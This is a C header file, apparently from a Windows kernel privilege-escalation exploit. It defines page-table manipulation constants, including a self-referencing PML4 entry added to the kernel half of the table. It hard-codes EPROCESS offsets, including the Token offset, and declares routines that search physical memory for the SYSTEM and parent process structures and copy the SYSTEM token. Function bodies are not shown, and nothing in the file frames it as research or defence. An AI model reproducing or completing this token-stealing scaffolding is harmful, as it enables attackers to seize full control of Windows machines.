#pragma once
#define PML4_BITS_SIZE 9
#define PDP_BITS_SIZE 9
#define PD_BITS_SIZE 9
#define PT_BITS_SIZE 9
#define OFFSET_IN_FRAME_BITS_SIZE 12

#define SIGN_EXTEND 0xFFFF000000000000ULL
#define SELF_REF_ENTRY 0x1EDULL

#define KERNEL_PML4_ENTRIES_START 0x100 // add our entry to the uppr half of the PML4 (the kernel half [256-512])
#define TABLE_MAX_ENTRIES  0x200
#define ENTRY_SIZE 0x8
#define PAGE_SIZE 0x1000
#define LARGE_PAGE_SIZE 0x200000
#define ENTRIES_TO_ADD 31

#define FLAGS 0x67
#define LARGE_PAGE_FLAGS 0xE7

#define PY_MEM_MASK 0x7FFFFFFFULL // mask to get lower 30 bits (pdp+pd+offset)

#define PHMEM_REG_KEY L"Hardware\\ResourceMap\\System Resources\\Physical Memory"
#define PHMEM_REG_VALUE_NAME L".Translated"

#define _DISCARD_FLAGS(entry) (entry & ~0xFFFF000000000000) // discard the top 16 bits of the entry/struct (see: nt!_MMPTE_HARDWARE)
#define DISCARD_FLAGS(entry) (_DISCARD_FLAGS(entry) & ~0xFFF) // discard the lower 12 bits (see: nt!_MMPTE_HARDWARE)
#define CHECK_LARGE_PAGE(pfn) ( (pfn & 0xfff) & 0x80 ) // check if the PD entry is a large page

typedef struct {
    UWORD offset;
    union
    {
        UCHAR ImageFileName[15];
        DWORD PriorityClass;
        DWORDLONG ProcessLock;
        DWORDLONG UniqueProcessID;
    };
} identifier;

typedef struct {
    identifier identifers[4];
} search_identifiers;

typedef enum {
    ProcessLockOffset = 0x160,
    UniqueProcessIDOffset = 0x180,
    ActiveProcessLinksFlinkOffset = 0x188,
    ImageFileNameOffset = 0x2e0,
    PriorityClassOffset = 0x2ef,
    TokenOffset = 0x208
} offsets;

enum {
    ProcessLockIndex,
    UniqueProcessIDIndex,
    ImageFileNameIndex,
    PriorityClassIndex
};

typedef struct {
    DWORD64 start;
    DWORD64 size;
    DWORD64 end;
} memory_region;

typedef struct {
    DWORD64 count;
    memory_region* regions;
} memory_regions;

typedef struct {
    DWORD pid;
    UCHAR szExeFile[15];
} process_info;

typedef struct {
    DWORD64 system_eprocess;
    BOOL s_found;
    DWORD64 parent_process_eprocess;
    BOOL p_found;
} found_eprocess;

typedef struct {
    BOOL large_page;
    DWORD64 pml4_base;
    DWORD64 sign_extend : 16;
    DWORD64 pml4_index : 9;
    DWORD64 pdp_index : 9;
    DWORD64 pd_index : 9;
    DWORD64 pt_index : 9;
    DWORD64 offset : 12;
    DWORD64 pml4_pfn;
    DWORD64 pdp_pfn;
    DWORD64 pd_pfn;
    DWORD64 pt_pfn;
    DWORD64 phy_address;
} va_discriptor;

typedef struct {
    USHORT count;
    DWORD64 pml4_base;
    va_discriptor* pages;
} ph_pages;

DWORD64 get_table_base_va(paging_tables);
VOID setup_paging(ph_pages*);
BOOL find_eprocess(found_eprocess*);
BOOL parse_phmem_regions(memory_regions*);
BOOL find_low_stub(ULONG_PTR*);
DWORD64 find_initial_eprocess(DWORD64);
BOOL get_parent_process(process_info*);
VOID search_memory(identifier*, identifier*, memory_regions*, found_eprocess*);
BOOL duplicate_token(DWORD64, DWORD64);
VOID get_phy_pages(ph_pages*);
VOID MMU(BOOL, DWORD64, va_discriptor*);
DWORD64 offsets_to_va(DWORD64, DWORD64, DWORD64, DWORD64, DWORD64, BOOL);
VOID va_to_offsets(DWORD64, va_discriptor*);
VOID get_ntoskrnl_offsets(DWORD64*, DWORD64*);
BOOL traverse_eporcess_list(identifier*, DWORD64, found_eprocess*);

UWORD added_entry = KERNEL_PML4_ENTRIES_START;
DWORD64 kernel_pml4_base;